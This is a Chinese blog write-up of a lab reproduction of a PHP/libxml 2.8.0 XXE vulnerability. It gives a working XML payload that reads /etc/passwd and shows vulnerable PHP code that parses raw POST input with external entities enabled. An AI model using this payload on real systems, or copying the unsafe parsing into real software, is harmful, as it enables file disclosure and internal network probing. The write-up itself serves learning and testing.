---
title: php-xxe
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-11T23:48:09+08:00
categories: 
- 渗透测试
- 漏洞复现
- Php
---

## 漏洞复现：

进入靶场

```
docker compose up -d
```

访问8080端口即可看到phpinfo界面，搜索libxml即可看到版本号为2.8.0，存在外部实体加载漏洞，访问漏洞存在的页面添加payload

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

![php-xxe](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\php-xxe.png)

也可以使用http进行内网主机探测，这里不再过多介绍

## 漏洞分析：

由于libxml2.8.0版本能然允许外部实体的加载，因此我们可以通过xmlpayload进行操作，看一下网站的源码，其中一个文件

```php
<?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);

echo $xml->name;
```

直接解析了post的内容，并且回显在name位，因此只需要在<name></name>处调用读取文件的外部实体即可

dom.php则更简单，不需要指定的名称即可调用

```php
<?php
$data = file_get_contents('php://input');

$dom = new DOMDocument();
$dom->loadXML($data);

print_r($dom);
```

**利用条件**

libxml版本低于2.9.0允许外部实体的加载，该漏洞与php版本无关